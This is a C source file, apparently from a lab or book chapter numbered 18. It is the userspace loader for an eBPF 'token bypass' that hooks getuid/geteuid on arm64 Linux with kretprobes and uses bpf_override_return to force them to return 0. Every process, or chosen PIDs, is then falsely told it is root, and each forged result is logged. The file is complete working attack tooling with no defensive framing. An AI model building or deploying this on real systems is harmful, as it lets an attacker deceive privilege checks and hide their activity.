// ch18 token-bypass — userspace loader
//
// Forges getuid()/geteuid() syscall returns to 0 by attaching kretprobes
// to __arm64_sys_getuid / __arm64_sys_geteuid and calling
// bpf_override_return(ctx, 0). Both targets are on the kernel
// error-injection allowlist on 6.12 aarch64 linuxkit, so the override
// actually takes effect.
//
// Modes:
//   --all              forge every getuid/geteuid call (wildcard)
//   --tgid <pid>       forge only calls from <pid> (may be repeated)
//   -h                 usage
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>
#include <getopt.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "ch18-token-bypass.skel.h"

struct evt {
    unsigned int pid;
    unsigned int tgid;
    char comm[16];
    long orig_ret;
    int syscall_id;   // 0=getuid 1=geteuid
    int flipped;
};

static volatile sig_atomic_t stop;
static void on_signal(int sig)
{
    (void)sig;
    stop = 1;
}

static int handle(void *ctx, void *data, size_t sz)
{
    (void)ctx;
    if (sz < sizeof(struct evt))
        return 0;
    const struct evt *e = data;
    const char *sc = e->syscall_id == 0 ? "getuid" : "geteuid";
    if (e->flipped)
        printf("[token] FORGE pid=%u comm=%s %s: %ld -> 0 (root)\n",
               e->pid, e->comm, sc, e->orig_ret);
    return 0;
}

static int libbpf_print(enum libbpf_print_level lvl, const char *fmt, va_list ap)
{
    if (lvl == LIBBPF_DEBUG)
        return 0;
    return vfprintf(stderr, fmt, ap);
}

static void usage(const char *prog)
{
    fprintf(stderr,
            "Usage: %s [--all] [--tgid <pid>]... [-v] [-h]\n"
            "  --all          forge every getuid/geteuid call (wildcard)\n"
            "  --tgid <pid>   forge only calls from <pid> (may be repeated,\n"
            "                 up to 1024 entries)\n"
            "  -v             verbose libbpf output\n"
            "  -h             show this help\n"
            "Events are written to stdout; status to stderr.\n",
            prog);
}

// Returns 1 if symbol present in /proc/kallsyms, 0 absent, -1 on I/O error.
static int kallsyms_has(const char *sym)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) {
        fprintf(stderr, "[token] open /proc/kallsyms: %s\n", strerror(errno));
        return -1;
    }
    char line[512];
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        char *name = strchr(line, ' ');
        if (!name) continue;
        name = strchr(name + 1, ' ');
        if (!name) continue;
        name++;
        size_t n = strlen(name);
        while (n && (name[n-1] == '\n' || name[n-1] == '\t' || name[n-1] == ' '))
            name[--n] = 0;
        char *br = strchr(name, '\t');
        if (br) *br = 0;
        if (strcmp(name, sym) == 0) {
            found = 1;
            break;
        }
    }
    fclose(f);
    return found;
}

#define MAX_TARGETS 1024

int main(int argc, char **argv)
{
    int verbose = 0;
    int wildcard = 0;
    unsigned int targets[MAX_TARGETS];
    size_t n_targets = 0;

    static const struct option longopts[] = {
        { "all",  no_argument,       NULL, 'A' },
        { "tgid", required_argument, NULL, 'T' },
        { "help", no_argument,       NULL, 'h' },
        { 0, 0, 0, 0 },
    };

    int opt;
    while ((opt = getopt_long(argc, argv, "vh", longopts, NULL)) != -1) {
        switch (opt) {
        case 'A':
            wildcard = 1;
            break;
        case 'T': {
            if (n_targets >= MAX_TARGETS) {
                fprintf(stderr, "[token] too many --tgid entries (max %d)\n",
                        MAX_TARGETS);
                return 2;
            }
            char *end = NULL;
            unsigned long v = strtoul(optarg, &end, 10);
            if (!end || *end || v == 0 || v > 0x7fffffffUL) {
                fprintf(stderr, "[token] invalid tgid: %s\n", optarg);
                return 2;
            }
            targets[n_targets++] = (unsigned int)v;
            break;
        }
        case 'v':
            verbose = 1;
            break;
        case 'h':
            usage(argv[0]);
            return 0;
        default:
            usage(argv[0]);
            return 2;
        }
    }
    if (optind != argc) {
        fprintf(stderr, "[token] unexpected argument: %s\n", argv[optind]);
        usage(argv[0]);
        return 2;
    }
    if (!wildcard && n_targets == 0) {
        fprintf(stderr, "[token] no targets specified; pass --all or --tgid <pid>\n");
        usage(argv[0]);
        return 2;
    }

    if (verbose)
        libbpf_set_print(libbpf_print);

    int rc = 1;
    struct ring_buffer *rb = NULL;
    struct ch18_token_bypass_bpf *s = ch18_token_bypass_bpf__open();
    if (!s) {
        fprintf(stderr, "[token] skeleton open failed: %s\n", strerror(errno));
        return 1;
    }

    // Symbol preflight.
    int has_get  = kallsyms_has("__arm64_sys_getuid");
    int has_gete = kallsyms_has("__arm64_sys_geteuid");
    if (has_get == 0) {
        fprintf(stderr, "[token] symbol __arm64_sys_getuid absent — disabling kr_getuid\n");
        if (bpf_program__set_autoload(s->progs.kr_getuid, false))
            fprintf(stderr, "[token] set_autoload(kr_getuid,false) failed\n");
    } else if (has_get > 0) {
        fprintf(stderr, "[token] symbol=__arm64_sys_getuid\tstatus=present\n");
    } else {
        fprintf(stderr, "[token] kallsyms unreadable — proceeding optimistically\n");
    }
    if (has_gete == 0) {
        fprintf(stderr, "[token] symbol __arm64_sys_geteuid absent — disabling kr_geteuid\n");
        if (bpf_program__set_autoload(s->progs.kr_geteuid, false))
            fprintf(stderr, "[token] set_autoload(kr_geteuid,false) failed\n");
    } else if (has_gete > 0) {
        fprintf(stderr, "[token] symbol=__arm64_sys_geteuid\tstatus=present\n");
    }

    int err = ch18_token_bypass_bpf__load(s);
    if (err) {
        fprintf(stderr, "[token] load failed: %s\n", strerror(-err));
        goto out;
    }

    int n_attached = 0, n_skipped = 0;
    struct bpf_program *prog;
    bpf_object__for_each_program(prog, s->obj) {
        if (!bpf_program__autoload(prog)) {
            n_skipped++;
            continue;
        }
        struct bpf_link *link = bpf_program__attach(prog);
        long e = libbpf_get_error(link);
        if (e) {
            fprintf(stderr, "[token] attach prog=%s failed: %s\n",
                    bpf_program__name(prog), strerror(-(int)e));
            continue;
        }
        n_attached++;
    }
    fprintf(stderr, "[token] attached=%d\tskipped=%d\n", n_attached, n_skipped);
    if (n_attached == 0) {
        fprintf(stderr, "[token] no programs attached — nothing to do\n");
        goto out;
    }

    if (wildcard) {
        unsigned int z = 0, one = 1;
        err = bpf_map__update_elem(s->maps.target_tgids,
                                   &z, sizeof(z),
                                   &one, sizeof(one), BPF_ANY);
        if (err) {
            fprintf(stderr, "[token] wildcard install failed: %s\n", strerror(-err));
        } else {
            fprintf(stderr, "[token] tag=target\tmode=wildcard\n");
        }
    }
    for (size_t i = 0; i < n_targets; i++) {
        unsigned int tgid = targets[i];
        unsigned int one = 1;
        err = bpf_map__update_elem(s->maps.target_tgids,
                                   &tgid, sizeof(tgid),
                                   &one, sizeof(one), BPF_ANY);
        if (err) {
            fprintf(stderr, "[token] target tgid=%u update failed: %s\n",
                    tgid, strerror(-err));
        } else {
            fprintf(stderr, "[token] tag=target\ttgid=%u\n", tgid);
        }
    }

    rb = ring_buffer__new(bpf_map__fd(s->maps.events), handle, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "[token] ring_buffer__new failed: %s\n", strerror(errno));
        goto out;
    }

    struct sigaction sa = { .sa_handler = on_signal };
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);

    fprintf(stderr, "[token] status=ready\tmsg=token bypass active\n");
    while (!stop) {
        int n = ring_buffer__poll(rb, 200);
        if (n < 0 && n != -EINTR) {
            fprintf(stderr, "[token] ring_buffer__poll: %s\n", strerror(-n));
            break;
        }
    }
    rc = 0;

out:
    if (rb)
        ring_buffer__free(rb);
    if (s)
        ch18_token_bypass_bpf__destroy(s);
    return rc;
}
